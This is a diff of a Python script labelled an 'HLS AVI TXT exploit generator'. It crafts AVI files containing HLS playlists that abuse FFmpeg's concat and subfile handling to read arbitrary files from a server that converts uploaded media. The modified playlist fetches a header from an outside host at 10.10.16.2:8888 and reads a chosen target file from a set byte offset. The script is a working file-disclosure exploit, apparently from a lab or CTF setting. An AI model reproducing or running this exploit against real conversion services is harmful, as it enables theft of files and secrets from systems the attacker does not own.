@@ -12,27 +12,22 @@ def make_txt_packet(content, fake_packets=50, fake_packet_len=200):
 
 TXT_PLAYLIST = """#EXTM3U
 #EXT-X-MEDIA-SEQUENCE:0
-#EXTINF:1.0,
-#EXT-X-BYTERANGE: 0
-{txt}
-#EXTINF:1.0,
-{file}
+#EXTINF:10.0,
+concat:http://10.10.16.2:8888/header.m3u8|subfile,,start,{start},end,10000,,:{file}
 #EXT-X-ENDLIST"""
 
-def prepare_txt_packet(txt, filename):
-    return make_txt_packet(TXT_PLAYLIST.format(txt=txt, file=filename).encode())
+def prepare_txt_packet(target, start=1):
+    return make_txt_packet(TXT_PLAYLIST.format(file=target, start=start).encode())
 
 # TXT_LIST = ['/usr/share/doc/gnupg/Upgrading_From_PGP.txt', '/usr/share/doc/mount/mount.txt', '/etc/pki/nssdb/pkcs11.txt', '/usr/share/gnupg/help.txt']
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser('HLS AVI TXT exploit generator')
-    parser.add_argument('filename', help='file that should be read from convertion instance')
-    parser.add_argument('output_avi', help='where to save the avi')
-    parser.add_argument('--txt', help='any .txt file that exist on target system', default='GOD.txt')
+    parser.add_argument('target', help='any file that exist on target system')
+    parser.add_argument('output', help='where to save the avi')
+    parser.add_argument('--start', help='position in the target file, in byte count', default='1')
     args = parser.parse_args()
-    avi = AVI_HEADER + prepare_txt_packet(args.txt, args.filename)
-    output_name = args.output_avi
 
-    with open(output_name, 'wb') as f:
-        f.write(avi)
+    with open(args.output, 'wb') as f:
+        f.write(AVI_HEADER + prepare_txt_packet(args.target, args.start))
 
